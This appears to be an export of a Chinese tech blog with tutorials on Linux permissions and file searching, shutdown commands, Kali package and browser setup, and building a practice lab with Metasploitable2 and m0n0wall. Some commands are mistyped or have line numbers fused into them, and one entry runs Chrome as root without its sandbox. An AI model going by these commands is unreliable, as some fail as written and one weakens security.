并没有被拿掉任何权限，不过 group 与 others 的权限被拿掉了 2 (也就是 w 这个权限)，那么当使用者： 创建文件时：(-rw-rw-rw-) - (—–w–w-) ==&gt; -rw-r–r– 创建目录时：(drwxrwxrwx) - (d—-w–w-) ==&gt; drwxr-xr-x umask的利用与重要性当我们需要新建文件给同群组的使用者共同编辑时，那么 umask 的群组就不能拿掉 2 这个 w 的权限！umask 就得要是 002 之类的才可以！这样新建的文件才能够是 -rw-rw-r– 的权限模样,那么直接在 umask 后面输入 002 就好了！123root@jack:~# umask 002root@jack:~# umask0002 umask 对於新建文件与目录的默认权限是很有关系的！这个概念可以用在任何服务器上面， 尤其是未来在你架设文件服务器 (file server) ！ 在默认的情况中， root 的 umask 会拿掉比较多的属性，root 的 umask 默认是 022 ， 这是基於安全的考量啦～至於一般身份使用者，通常他们的 umask 为 002 ，亦即保留同群组的写入权力 文件的隐藏属性要先强调的是，底下的chattr命令只能在Ext2/Ext3的文件系统上面生效， 其他的文件系统可能就无法支持这个命令了！ chattr (配置文件隐藏属性)123456789101112root@jack:~# chatter [+-=] (参数值) 文件或者目录选项与参数:&apos;+&apos; ：添加某一个特殊参数，其他原本存在参数则不动。&apos;-&apos; ：移除某一个特殊参数，其他原本存在参数则不动。&apos;=&apos; ：配置一定，且仅有后面接的参数a:当配置 a 之后，这个文件将只能添加数据，而不能删除也不能修改数据，只有root才能配置这个属性。 i:这个 i 可就很厉害了！他可以让一个文件『不能被删除、改名、配置连结也无法写入或新增数据！』对於系统安全性有相当大的助益！只有 root 能配置此属性A:当配置了 A 这个属性时，若你有存取此文件(或目录)时，他的存取时间 atime将不会被修改，可避免I/O较慢的机器过度的存取磁碟。这对速度较慢的计算机有帮助S:一般文件是非同步写入磁碟的(原理请参考第五章sync的说明)，如果加上 S 这个 属性时，当你进行任何文件的修改，该更动会『同步』写入磁碟中。s:当文件配置了 s 属性时，如果这个文件被删除，他将会被完全的移除出这个硬盘空间，所以如果误删了，完全无法救回来了喔！u:与 s 相反的，当使用 u 来配置文件时，如果该文件被删除了，则数据内容其实还存在磁碟中，可以使用来救援该文件喔！属性配置常见的是 a 与 i 的配置值，而且很多配置值必须要身为 root 才能配置! 这个命令是很重要的，尤其是在系统的数据安全上面！由於这些属性是隐藏的性质，所以需要以 lsattr 才能看到该属性呦！其中，个人认为最重要的当属 +i 与 +a 这个属性了。+i 可以让一个文件无法被更动，对於需要强烈的系统安全的人来说， 真是相当的重要的！ lsattr (显示文件隐藏属性)使用 chattr 配置后，可以利用 lsattr 来查阅隐藏的属性。12345root@jack:~# lsattr [-adR] 文件或目录选项与参数：-a ：将隐藏档的属性也秀出来；-d ：如果接的是目录，仅列出目录本身的属性而非目录内的档名；-R ：连同子目录的数据也一并列出来！ 文件特殊权限:SUID,SGID,SBIT Set UID我们直接来看看/usr/bin/passwd的文件权限是何?12root@jack:~# ls -l /usr/bin/passwd-rwsr-xr-x 1 root root 54192 11月 21 2014 /usr/bin/passwd 可以看到，这个文件的权限有点特殊啊，多了一s权限？其实这就是被称为 Set UID，简称为 SUID 的特殊权限，下面是他的功能与限制: SUID 权限仅对二进位程序(binary program)有效； 运行者对於该程序需要具有 x 的可运行权限； 本权限仅在运行该程序的过程中有效 (run-time)； 运行者将具有该程序拥有者 (owner) 的权限。 SGID SGID权限对于文件和目录均有影响，具体可学习完第十七章在回来看看 SBIT(Sticky Bit) 简单的讲，当一个目录拥有SBIT权限时，便只有目录拥有者和root可以删除该目录，其他人只具有对该目录的w,x权限。 SUID/SDIG/SBIT权限配置 与之前给文件配置读写权限一样，我们依然可以通过数字权限的方法为文件添加SUID/SGID等权限，其中: 4为SUID 2为SGID 1为SBIT 此外还有大T与大S的产生12345678910root@jack:~# cd /tmp/root@jack:/tmp# touch testroot@jack:/tmp# chmod 4755 test ;ll test &lt;==加入SUID权限-rwsr-xr-x 1 root root 0 4月 30 14:33 testroot@jack:/tmp# chmod 6755 test ;ll test &lt;==加入SUID/SGID权限-rwsr-sr-x 1 root root 0 4月 30 14:33 testroot@jack:/tmp# chmod 1755 test ;ll test &lt;==加入SBIT功能-rwxr-xr-t 1 root root 0 4月 30 14:33 testroot@jack:/tmp# chmod 7666 test ;ll test &lt;==具有空的SUID/SGID权限-rwSrwSrwT 1 root root 0 4月 30 14:33 test 值得注意的是最后一行，因为我们下达的是666权限，就是所有的人都不具备该文件的x权限，自然SUID/SGID也是空的了，就会显示T和S了 0x04 命令与文件的搜索 查找命令文件 which当我们使用ls这个命令时，有没有曾想过这个命令的完整文件是存放在何处的呢？这时你可以使用which来一看究竟:12345root@jack:~# which -a which/usr/bin/which/bin/which参数:-a 将所有PATH目录中可以找到的命令均列出，而只是找到的第一个！ 下面再来找一个命令:12root@jack:~# which cdroot@jack:~# 看到没有which并没有找到cd这个命令，why？这是因为cd是[bash内建的命令]而which默认是找PATH内所规范的目录，so that！关于bash我以后再谈！ 最后，要知道的是，which是根据使用者所配置的PATH变量内的目录去搜寻可运行文件的，即不同PATH配置内容所找到的命令是不一样的，你想说明啥?123456root@jack:~# su chen$ which ifconfig$$ exitroot@jack:~# which ifconfig/sbin/ifconfig 看到了吗，一般账户chen是which不到ifconfig这个命令的，而root是可以的！ 查找文件 whereis locate find whereisLinux系统会将系统内的所有文件记录在一个数据库文件里面，当使用whereis或者locate是，会以此数据库文的内容为准，因而有时当我们使用这两命令时，会找到已经被杀掉的文件，或者找不到刚刚新建立的文件，当然比起find的全盘搜索，它们俩会快很多！ 12345678root@jack:~# whereis ifconfigifconfig: /sbin/ifconfig /usr/share/man/man8/ifconfig.8.gz# whereis [-bmsu] 文件与目录名选项与参数:-b:只找binary格式的文件-m:只找在说明文件manual路径下的文件-s:只找source来源文件-u:找出上述三种以外的其他类型文件 locatelocate用起来就更简单了:12345678root@jack:~# locate ifconfig/sbin/ifconfig/usr/lib/python2.7/dist-packages/volatility/plugins/linux/ifconfig.py/usr/lib/python2.7/dist-packages/volatility/plugins/mac/ifconfig.py/usr/share/man/de/man8/ifconfig.8.gz# locate [-ir] filename选项与参数:-i:忽略大小写 Linux的数据库默认是一天升级一次，当然每个版本有所不同，所以当新建立一个文件时，数据库并没有升级，那么便会找不到了，所以此时也就必须要升级数据库了:1root@jack:~# updatedb 没错,就是一个词[updatedb]！ Tips: updatedb：根据 /etc/updatedb.conf 的配置去搜寻系统硬盘内的档名，并升级 /var/lib/mlocate 内的数据库文件；locate：依据 /var/lib/mlocate 内的数据库记载，找出使用者输入的关键字档名。 find $ find [PATH] [option] [action] 选项与参数:与时间有关的选项:与时间有关的选项，共有-actime，-ctime，-mtime，以-mtime说明: -mtime n: n是数字，意义为在n天之前的[一天之内]改动过内容的文件 -mtime +n:列出n天之前(不含n天本身)被改动过内容的文件 -mtime -n:列出在n天之内(含n天本身)被改动过内容的文件 -newer filename:列出比filename这个文件还要新的文件 实例一: 1root@jack:~# find / mtime 0 找出系统过去24小时内内容被改动过的文件来，”0”代表目前时间！倘若要找出三天前的24小时内被改动过内容的文件呢? 1root@jack:~# find / mtime 3 实例二:1root@jack:~# find /etc -newer /etc/passwd 寻找/etc下的文件，如果文件日期比/etc/passwd新就列出啦！所以要再找出4天内被改动的文件就是$ find /var mtime -4,要找出4天前的那一天就用$ find /etc -mtime 4 #####选项与参数:与使用者或群有关的参数 -uid n:n为数字，代表使用者账号id，亦即UID在/etc/passwd里面 -gid n:n为数字，代表群组id，亦即GID在/etc/group里面 -user name:使用者名字 -group name:群组名字 -nouser:寻找不属于任何使用在即是不存在于/etc/passwd下的人的文件 -nogroup:不属于/etc/group下的文件 实例一: 1root@jack:~# find /home -user root 寻找/home下不属于root账号的文件1root@jack:~# find / -nouser 搜索系统中不属于任何人的那些文件！ 选项与参数:与文件权限及名称有关的参数:*-name filename:查找文件filename -size [-+]SIZE:查找比SIZE(+)大或(-)小的文件。SIZE规格:c:代表byte，k:代表1024bytes。比如，要查找比50kb大的文件就是size +50k__ -type TYPE:TYPE的类型主要有:一般正规文件(f),装置文件(b,c),目录(d),软链接(l),socket(s),及FIFO(P). -perm mode:查找文件权限刚好等于mode的权限的文件，mode类似于chmod的属性值，如-rwsr-xr-x的属性为4755！ -perm -mode:查找文件权限必须包括mode的权限的文件！ -perm +mode:查找文件权限包含任一mode权限的文件 perm的主要作用就是找出那些具有特殊权限的文件了！ 实例一:1root@jack~# find /bin /sbin -perm +6000 查找/bin /sbin两个目录下，只要具有SUID或SGID权限的文件，SUID是4分，SGID是2分，ok！ find 的开挂技能action -exec command:command为其他命令，我们可以以此来处理查询到的结果 实例: 1root@jack~# find / -perm +7000 -exec ls -l &#123;&#125; \\\\; {} 代表的是『由 find 找到的内容』，如上图所示，find 的结果会被放置到 {} 位置中； -exec 一直到 \\; 是关键字，代表 find 额外动作的开始 (-exec) 到结束 (\\;) ，在这中间的就是 find 命令内的额外动作。 在本例中就是『 ls -l {} 』罗！因为『 ; 』在 bash 环境下是有特殊意义的，因此利用反斜线来跳脱。 再来，比如查找/tmp目录下所有的.md文件并将其全部移动到/myblog目录下:123$: mv `find /tmp -name &quot;*.md&quot;` /myblog $: find /tmp -name &quot;*.md&quot; | xargs -i mv &#123; &#125; /tmp$ find /tmp -name &quot;*.md&quot; -exex mv &#123;&#125; /tmp \; 最后find也支持通配符查找1root@jack:~# find /etc -name &apos;*httpd*&apos; 0x05 权限与命令间的关系现在我们来看看什么样的命令在什么样的权限在才能够运行！ 1.使用者能够进入某目录成为[可工作目录]的基本权限为何？ 如命令:cd 目录所需权限:使用者对该目录至少需要具有x的权限 如还想使用ls查询档案名，则还需具有r权限 2.使用者在某个目录内读取一个文件的基本权限为何？ 如命令:cat,more,less 目录所需权限:使用者至少对该目录具有x权限 文件所有权限:使用者至少对该文件具有r权限 3.使用者可以修改一个文件的基本权限为何？ 如命令:vi 目录所需权限:使用者至少对该目录具有x权限 文件所有权限:使用者至少对该文件具有r,,w权限 3.使用者可以创建一个文件的基本权限为何？ 如命令:touch 目录所需权限:使用者至少对该目录具有w,x权限 4.使用者进入某目录并运行该目录先的某个命令的基本权限为何? 目录所需权限:使用者至少对该目录具有x权限 文件所有权限:使用者至少对该文件具有x权限]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[第六章-文件权限与目录配置]]></title>
      <url>%2F2016%2F02%2F27%2F%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E4%B8%8E%E7%9B%AE%E5%BD%95%E9%85%8D%E7%BD%AE%2F</url>
      <content type="text"><![CDATA[0x00 使用者与群组 文件拥有者由于Linux是个多人多任务的系统，因此可能常常会有多人同时使用这部主机来进行工作的情况发生， 为了考虑每个人的隐私权以及每个人喜好的工作环境，因此，这个『文件拥有者』的角色就显的相当的重要了！ 群组概念 群组的功能其实在进行团队开发的时候，经过简易的文件权限设定，限制非自己团队(亦即是群组) 的其他人不能够阅览内容啰！而且亦可以让自己的群组成员可以修改我所建立的文件！ 其他人就是独立于以上两种之外的第三种身份。 在Linux里面，任何一个文件都具有『User, Group及Others』三种身份的个别权限 Linux 用户身份与群组记录的文件Linux系统当中，默认的情况下，所有的系统上的账号与一般身份使用者，还有那个root的相关信息， 都是记录在/etc/passwd这个文件内的。至于个人的密码则是记录在/etc/shadow这个文件下。 此外，Linux所有的组名都纪录在/etc/group内！这三个文件可以说是Linux系统里面账号、密码、群组信息的集中地! 不要随便删除这三个文件啊！ 0x01 Linux 文件权限概念 命令ls是查看文件的指令，ls-al则是列出所有文件详细的权限与属性包括隐藏文件。 1$ ls-al 得到的信息如下图： 第一栏代表这个文件的类型与权限(permission)： 第一个字符代表这个文件是『目录、文件或链接文件等等』： 当为[ d ]则是目录，例如上表档名为『.gconf』的那一行； 当为[ - ]则是文件，例如上表档名为『install.log』那一行； 若是[ l ]则表示为连结档(link file)； 若是[ b ]则表示为装置文件里面的可供储存的接口设备(可随机存取装置)； 若是[ c ]则表示为装置文件里面的串行端口设备，例如键盘、鼠标(一次性读取装置)。 接下来的字符中，以三个为一组，且均为『rwx』的三个参数的组合。其中，[ r ]代表可读(read)、[ w ]代表可写(write)、[ x ]代表可执行(execute)。 要注意的是，这三个权限的位置不会改变，如果没有权限，就会出现减号[ - ]而已。 第一组为『文件拥有者的权限』该文件的拥有者可以读写，但不可执行； 第二组为『同群组的权限』； 第三组为『其他非本群组的权限』。 目录与文件的权限意义并不相同，这是因为目录与文件所记录的数据内容不相同所致。 由于目录与文件的权限意义非常的重要 第二栏表示有多少档名连结到此节点(i-node)每个文件都会将他的权限与属性记录到文件系统的i-node中，不过，我们使用的目录树却是使用文件名来记录， 因此每个档名就会连结到一个i-node啰！这个属性记录的，就是有多少不同的档名连结到相同的一个i-node号码去就是了! 第三栏表示这个文件(或目录)的『拥有者账号』 第四栏表示这个文件的所属群组在Linux系统下，你的账号会附属于一个或多个的群组中 第五栏为这个文件的容量大小，默认单位为bytes 第六栏为这个文件的建档日期或者是最近的修改日期 第七栏为这个文件的档名 比较特殊的是：如果档名之前多一个『 . 』，则代表这个文件为『隐藏档』 0x02 如何改变文件属性与权限 chgrp (change group):改变文件所属群组要被改变的组名必须要在/etc/group文件内存在才行，否则就会显示错误!chown (change owner):改变文件拥有者要注意的是，用户必须是已经存在系统中的账号，也就是在/etc/passwd 这个文件中有纪录的用户名称才能改变。 chmod:改变文件的权限, SUID, SGID, SBIT等等的特性文件权限的改变使用的是chmod这个指令，但是，权限的设定方法有两种， 分别可以使用数字或者是符号来进行权限的变更。我们就来谈一谈： 数字类型改变文件权限Linux文件的基本权限就有九个，分别是owner/group/others三种身份各有自己的read/write/execute权限，先复习一下刚刚上面提到的数据：文件的权限字符为：『-rwxrwxrwx』，这九个权限是三个三个一组的！其中，我们可以使用数字来代表各个权限，各权限的分数对照表如下: r:4; w:2; x:1 每种身份(owner/group/others)各自的三个权限(r/w/x)分数是需要累加的，例如当权限为： [-rwxrwx—] 分数则是： owner = rwx = 4+2+1 = 7 group = rwx = 4+2+1 = 7 others= — = 0+0+0 = 0 变更权限的指令chmod的语法:123$ chmod [-R] xyz 文件或者目录#xyz就是刚刚提到的数字类型的权限属性，为 rwx 属性数值的相加。#-R:进行递归(recursive)的持续变更，亦即连同次目录下的所有文件都会变更 另外，在实际的系统运作中最常发生的一个问题就是，常常我们以vim编辑一个shell的文字批处理文件后，他的权限通常是 -rw-rw-r– 也就是664,如果要将该文件变成可执行文件，并且不要让其他人修改此一文件的话,那么就需要-rwxr-xr-x这样的权限，此时就得要下达：『 chmod 755 test.sh 』的指令！另外，如果有些文件你不希望被其他人看到，那么应该将文件的权限设定为例如：『-rwxr—–』，那就下达『 chmod 740 filename 』吧！ 符号类型改变文件权限还有一个改变权限的方法呦！从之前的介绍中我们可以发现，基本上就九个权限分别是(1)user(2)group(3)others三种身份啦！那么我们就可以藉由u, g, o来代表三种身份的权限！此外，a 则代表all亦即全部的身份!那么读写的权限就可以写成r, w, x！也就是可以使用底下的方式来看： 假如我们要『设定』一个文件的权限成为『-rwxr-xr-x』时，基本上就是： user (u)：具有可读、可写、可执行的权限； group 与 others (g/o)：具有可读与执行的权限。 即是:1$ chmod u=rwx g=xt o=x 将文件赋予所有的执行权限:1$ chmod a+x filename 0x03 目录与文件之权限意义 权限对文件的意义文件是实际含有数据的地方，包括一般文本文件、数据库内容文件、二进制可执行文件(binary program)等等。因此，权限对于文件来说，他的意义是这样的： r (read)：可读取此一文件的实际内容，如读取文本文件的文字内容等； w (write)：可以编辑、新增或者是修改该文件的内容(但不含删除该文件)； x (execute)：该文件具有可以被系统执行的权限。 值得注意的是，在Windows底下一个文件是否具有执行的能力是藉由『 扩展名 』来判断的， 例如：.exe, .bat, .com 等等，但是在Linux底下，我们的文件是否能被执行，则是藉由是否具有『x』这个权限来决定的！跟档名是没有绝对的关系的！ 权限对目录的意义文件是存放实际数据的所在地，而目录则是记录文件名列表。 r，w，x对目录的意义 r (read contents in directory):表示具有读取目录结构列表的权限，所以当你具有读取(r)一个目录的权限时，表示你可以查询该目录下的文件名数据。 w (modify contents of directory):表示你具有异动该目录结构列表的权限 建立新的文件与目录； 删除已经存在的文件与目录(不论该文件的权限为何！) 将已存在的文件或目录进行更名； 搬移该目录内的文件、目录位置。 x (access directory)：目录的x代表的是用户能否进入该目录成为工作目录,所谓的工作目录(work directory)就是你目前所在的目录啦。 工作目录对于指令的执行是非常重要的，如果你在某目录下不具有x的权限， 那么你就无法切换到该目录下，也就无法执行该目录下的任何指令，即使你具有该目录的r的权限。 要开放目录给任何人浏览时，应该至少也要给予r及x的权限，但w权限不可随便给! 0x03 Linux文件种类与扩张名 文件种类 正规文件(regular file) 纯文本文件(ASCII):这是Linux系统中最多的一种文件类型啰， 称为纯文本档是因为内容为我们人类可以直接读到的数据，例如数字、字母等等。 _二进制文件(binary):_Linux当中的可执行文件(scripts, 文字型批处理文件不算)就是这种格式的。 数据格式文件(data)：有些程序在运作的过程当中会读取某些特定格式的文件，那些特定格式的文件可以被称为数据文件 (data file)。举例来说，我们的Linux在使用者登入时，都会将登录的数据记录在/var/log/wtmp那个文件内，该文件是一个data file，他能够透过last这个指令读出来！ 但是使用cat时，会读出乱码～因为他是属于一种特殊格式的文件。 目录(directory) 就是目录[d] 连接档(link) 类似于windows下的快捷方式。 设备与装置文件(device) 与系统周边及储存等相关的一些文件，通常都集中在/dev这个目录之下！通常又分为两种： 区块(block)设备档 ：就是一些储存数据，以提供系统随机存取的接口设备，举例来说，硬盘与软盘等就是啦！你可以随机的在硬盘的不同区块读写，这种装置就是成组设备啰！你可以自行查一下/dev/sda看看，会发现第一个属性为[ b ]喔！ 字符(character)设备文件：亦即是一些串行端口的接口设备， 例如键盘、鼠标等等！这些设备的特色就是『一次性读取』的，不能够截断输出.举例来说，你不可能让鼠标『跳到』另一个画面，而是『滑动』到另一个地方啊！第一个属性为 [ c ]。 数据接口文件(sockets)：这种类型的文件通常被用在网络上的数据承接，第一个属性为 [ s ]， 最常在/var/run这个目录中看到这种文件类型了。 数据输送文件(FIFO, pipe)： FIFO也是一种特殊的文件类型，他主要的目的在解决多个程序同时存取一个文件所造成的错误问题。 FIFO是first-in-first-out的缩写。第一个属性为[p] 。 0x04 Linux文件的所谓扩展基本上，Linux的文件是没有所谓的『扩展名』的，在Windows底下,能被执行的文件扩展名通常是 .com .exe .bat等等，而在Linux底下，只要你的权限当中具有x的话，例如[ -rwx-r-xr-x ]即代表这个文件可以被执行喔！不过，可以被执行跟可以执行成功是不一样的！ 所以在Linux下我们还是会以适当的扩展名来表示该文件是什么种类的，一下是几种常用的扩展名： .sh：脚本或批处理文件 (scripts)，因为批处理文件为使用shell写成的，所以扩展名就编成 .sh ； .Z, .tar, .tar.gz, .zip, .tgz： 经过打包的压缩文件。这是因为压缩软件分别为 gunzip, tar 等等的，由于不同的压缩软件，而取其相关的扩展名啰！ .html, .php：网页相关文件，分别代表 HTML 语法与 PHP 语法的网页文件啰！ .html 的文件可使用网页浏览器来直接开启，至于 .php 的文件， 则可以透过 client 端的浏览器来 server 端浏览，以得到运算后的网页结果呢！]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[第五章-开关机命令]]></title>
      <url>%2F2016%2F02%2F27%2F%E7%AC%AC%E4%BA%94%E7%AB%A0-%E5%BC%80%E5%85%B3%E6%9C%BA%E5%91%BD%E4%BB%A4%2F</url>
      <content type="text"><![CDATA[不同于windows在Linux的运行环境下， 若不正常关机，则可能造成文件系统的毁损， 所以正常情况下，要关机时需要注意底下几件事： 如果要看目前有谁在在线，可以下达命令:1$ who 而如果要看网络的联机状态，可以下达命令:1$ netstat -a 而要看背景运行的程序可以运行命令:1$ ps-aux 使用这些命令可以让你稍微了解主机目前的使用状态！当然啰，就可以让你判断是否可以关机了 （这些命令在后面Linux常用命令中会提及喔！） #####正确的关机命令与使用: 将数据同步写入硬盘中的命令： 1$ sync 但现在 shutdown/reboot/halt 等等命令均已经在关机前进行了 sync 这个工具的呼叫. 惯用的关机命令： shutdown 可以自由选择关机模式：是要关机、重新启动或进入单人操作模式均可； 可以配置关机时间: 可以配置成现在立刻关机, 也可以配置某一个特定的时间才关机。 可以自定义关机信息：在关机之前，可以将自己配置的信息传送给在线 user 。 可以仅发出警告信息：有时有可能你要进行一些测试，而不想让其他的使用者干扰， 或者是明白的告诉使用者某段时间要注意一下！这个时候可以使用 shutdown 来吓一吓使用者，但却不是真的要关机啦. 可以选择是否要 fsck 检查文件系统 [root@www ~]# :shutdown [-t 秒] [-arkhncfF] 时间 [警告信息] 选项与参数：-t:-t 后面加秒数，亦即『过几秒后关机』的意思-k:不要真的关机，只是发送警告信息出去！-r:将系统的服务停掉之后就重新启动(常用)-h:将系统的服务停掉后，立即关机。 (常用)-n:经过 init 程序，直接以 shutdown 的功能来关机-f:关机并启动之后，强制略过 fsck 的磁盘检查-F:系统重新启动之后，强制进行 fsck 的磁盘检查-c:取消已经在进行的 shutdown 命令内容。 重新启动，关机： reboot, halt, poweroff 在linux中只有root才能执行shutdown，reboot命令 切换运行等级:init其实Linux共有七种运行等级， 七种等级的意义我们在后面会再谈到。本章你只要知道底下四种运行等级就好了： run level 0：关机 run level 3：纯文本模式 run level 5：含有图形接口模式 run level 6：重新启动]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[解决kali升级空间不足问题]]></title>
      <url>%2F2016%2F02%2F23%2F%E8%A7%A3%E5%86%B3kali%E5%8D%87%E7%BA%A7%E7%A9%BA%E9%97%B4%E4%B8%8D%E8%B6%B3%E9%97%AE%E9%A2%98%2F</url>
      <content type="text"><![CDATA[0x00 原因分析如果/var是单独分区的，可能是分区容量过小，更新系统或者安装大型软件时，使用到了/var目录，因此提示空间不足。使用一下办法即可解决。 方法1： 12sudo apt-get cleansudo apt-get autoremove 然后重启机器,如果仍然空间不足，使用方法2。 方法2：用symbolic links來解決 12345mv /var/spool /home //先移动/var下较大目录到/home或者其他某一空间足够大的目录。ln -s /home/spool /var //做一个symbolic link。/var/spool指向/home/spool以此来解决var空间不足的问题。 0x01 原因分析2如果/var没有单独分区，则系统默认共享使用/home目录，若此时提示/var空间不足，则说明/home空间不足，这种情况，建议重新安装系统，重新规划分区结构。一般来说，/var目录2G-4G为好，或者不分区，共享/home。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[kali软件安装和更新源]]></title>
      <url>%2F2016%2F02%2F23%2Fkali%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E5%92%8C%E6%9B%B4%E6%96%B0%E6%BA%90%2F</url>
      <content type="text"><![CDATA[0x00 安装Firefox首先卸载iceweasel 1$ apt-get remove iceweasel 然后打开更新源文件文件: 1$ gedit /etc/apt/source.list 添加如下更新源: deb http://downloads.sourceforge.net/project/ubuntuzilla/mozilla/apt all main 最后运行如下命令: 123$ apt-key adv --recv-keys --keyserver keyserver.ubuntu.com C1289A29$ apt-get update$ apt-get install firefox-mozilla-build 0x01 安装Google-Chrome首先下载deb chrome包:https://www.google.com/chrome/browser/thankyou.html?platform=linux 然后运行如下命令: 12345$ apt-get install alacarte$ apt-get -f install$ dpkg -i gooel-chrome-stabel-current-amd64.deb$ apt-get install libappindicator1$ apt-get -f install 然后添加一个chrome的普通用户: 12$ useradd -m chrome$ su chrome 进入到主菜单main menu 选择 internet 然后找到chrome 在 command中添加: 1gksu -u chrome google-chrome 并且点击左边的chrome图标更换chrome图片：computer-&gt;opt&gt;googel-&gt;chrome:product_logo_48.png ok！ 然后使用 leafpad命令: 1$ leafpad /opt/google/chrome/google-chrome 在exex -a &quot;$0&quot; &quot;$HERE/chrome&quot; &quot;$0&quot;后添加:–user -data-dir 12$ apt-get update &amp;&amp; apt-get upgrade$ reboot 然后使用su chrome用户运行google-chrome。 如果想要使用root身份运行Chrome，那么需要使得Chrome以非沙箱的形式运行: 1$ cd /usr/share/applications/ 打开google-chrome在command里添加%U –no-sandbox并将permission勾选Allow kali中chrome的proxy 将shadwosocks放在创建的chrome/home目录下，然后以root身份运行就好了，正确的姿势是: 123$ alias fuck-gwf=&quot;bash /home/chrome/Downloads/shadowsocks-gui-0.6.4-linux-x64/start.sh &gt; /tmp/shadow.txt 2&gt;&gt;&amp;1 &amp;&quot;$ fuck-gwf 记住一点，就是讲shadowsocks文件放为chrome创建的那用户的目录下就好。 0x03 Kali下的常用软件及运行环境播放器smplayer，flashplugin-nonfree，gdebi(图形化软件包安装界面)，amule(电驴)，qbittorrent(bt),geany(开发程序)，stardict(翻译软件)，freemind，netspeed(流量监控),mtr（路由追踪）filezilla(FTP工具) 0x04 install flashplayer1.首先到ado官网下载最新Linux版本的tar.gz文件。 2.打开终端，并切换到下载文件所在目录，执行命令: 1$: tar xzvf install_flash_player_11_linux.x86_64.tar.gz 3.进入解压出来的文件夹,找到 libflashplayer.so 拷贝到 /usr/lib/mozilla/plugins/ 下,命令如下： 1$: cp libflashplayer.so /usr/lib/mozilla/plugins/ 0x05 安装搜狗拼音首先需要安装fcitx框架1$: apt-get install fcitx 然后，下载对应的DEB包，直接双击安装就是了。 http://pinyin.sogou.com/linux/help.php 应用程序 –&gt; 常用程序 –&gt; 首选项 –&gt; fcitx设置 –&gt; 添加sougou拼音 卸载fcitx1$: apt-get remove --auto-remove fcitx 0x05 Kali apt resources查看 Kali 内核版本信息: 1$ uname -a 查看 Kali 发行版本信息: 1$ lsb_release -a (Kali official source)[http://docs.kali.org/general-use/kali-linux-sources-list-repositories]: 123$: leafpd /etc/apt/sources.listdeb http://http.kali.org/kali kali-rolling main non-free contrib if you changed the sources.list file,remember use apt-get update command. or you can: 12$: apt-get update--fix-missing &amp; apt-get dist-upgrade$: apt-get clean]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Kali实验环境的搭建]]></title>
      <url>%2F2016%2F02%2F23%2FKali%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA%2F</url>
      <content type="text"><![CDATA[0x00 搭建本地实验环境的必要性 渗透非授权系统的弊端，从法律和学习的角度是必须的。 搭建自己的实验环境，自己的环境自己爱怎么搞怎么搞，搭建实验环境过程可以更加了解系统的安装配置和特性，以及基础架构的安装配置，代码构建，作为一个安全工作者是十分有必要的。 0x01 安装windows虚拟机作为渗透对象 微软最新版本软件官方下载:http://msdn.microsoft.com/en-ca/subscriptions/aa336856 windows虚拟机:http://dev.modern.ie/tools/vms/ 0x01 安装Linux虚拟机作为渗透对象:Turnkey Linux 是一个基于 Ubuntu 8.04 LTS 的Linux 发行版 ,基于linux的虚拟机。 tuenkey的官方下载地址:http://tuenkeylinux.org 0x02 Linux ubuntu 下LAMP环境 Linux+appache+mysql+php环境的搭建 安装apache2 1$ sudo apt-get install apache2 apache2-utils 安装完成以后查看80端口是否已经开始真侦听:1$ netstat -anol |grep :80 apache2是否已经启动了:1$ ps aux | grep apache 重启apache:1$ sudo service apahce2 restart apache重启常见错误:“fully qualified domain” 解决方法:新建fadn.conf文件并添加代码:~ServerNname locahost~ 123$ sudo vi /etc/apache2/conf-avaliable/fqdn.conf ServerName localhost :wq! 保存退出！ 启用文件:1$ sudo a2enconf fqdn 安装Mysql1234$ sudo apt-get install mysql-server libapache2- mod-auth-mysql php5-mysql$ mysql_install_db &apos;建立数据库目录&apos;$ mysql_secure_installation &apos;对数据库进行安全设置&apos;$ mysql:mysql -u root -p &apos;进入Mysql&apos; 安装php1$ sudo apt-get install php5 php5-mysql php-pear php5-mcrypt php5-curl 0x03 Metasploitable2基于linux的一个靶机测试环境Metasploitable2虚拟系统是一个特别制作的ubuntu操作系统，本身设计作为安全工具测试和演示常见漏洞攻击。版本2已经可以下载，并且比上一个版本包含更多可利用的安全漏洞。这个版本的虚拟系统兼容VMware，VirtualBox,和其他虚拟平台。默认只开启一个网络适配器并且开启NAT和Host-only，本镜像一定不要暴漏在一个易受攻击的网络中。 默认登录名:msfadmin 密码:msfadmin 通过ifconifg查看默认IP地址，Metasploit的默认端口是192.168.1.107，首次使用默认的metasploitable需要进行一项配置，否则会造成所有测试失败: &gt; cd 进入文件 /var/www/mutillidae ，vi config.inc 文件将 $dbname一项改为“owasp10” 0x03 在虚拟机中模拟真实网络:M0n0wall防火墙: http://m0n0.ch/wall/downloads.php 首先建立防火墙需要至少为虚拟机添加三卡网卡，即是在vm中添加三块虚拟网卡，host-only的网卡接内网(LAN)对应VMnet8(le2)，第二块网卡桥接到物理网络（WAN）对应VMnet0(le0)，第三块网卡服负者连接到DMZ区对应VMnet0(le1)，如图所示: 得到M0m0wall的光盘安装包，为vm新建虚拟机，将M0mwall光盘安装包添加到虚拟机以安装防火墙： 第三步:安装完成以后会进入DOS界面 输入数字”7” 选择 install on hard drive 将防火墙从光盘安装到虚拟机的物理硬盘里，选择7以后添加”ad0”,待重启过程立刻停止客户机然后关机，移除cd硬盘！ 第四步:输入数字”1” 配置网络 防火墙至少需要三块网卡，外网，内网，DMZ，host-only的网卡接内网(LAN)le2，第一块网卡桥接到物理网络（WAN）le0，第二块网卡服负者连接到DMZ区，指定网口(interfaces:assign network port)哪个是接外的，哪个死接内的：为网卡添加tag标签，指定lan网卡le2和wan网卡le0以及Optional网卡le1: 第五步:输入数字”2”:为局域网lan网卡指定ip地址:192.168.14.1 sub mark:24 启动DHCP服务 设置dhcp网段的起始地址:192.168.14.20 结束地址:192.168.14.100 配置完成以后局域网网卡的ip地址为:http://192.168.14.1,当lan的ip地址配置完成以后就可以通过web页面对防火墙进行配置了 第六步:reset webgui password 重设web登录密码 mono默认密码 第七步:通过web页面对防火墙进行配置:登录名:damin 密码:mono 最后点击Rules添加防火墙规则,设置protocol为“any”允许客户机支持所有的协议， source 为“LAN 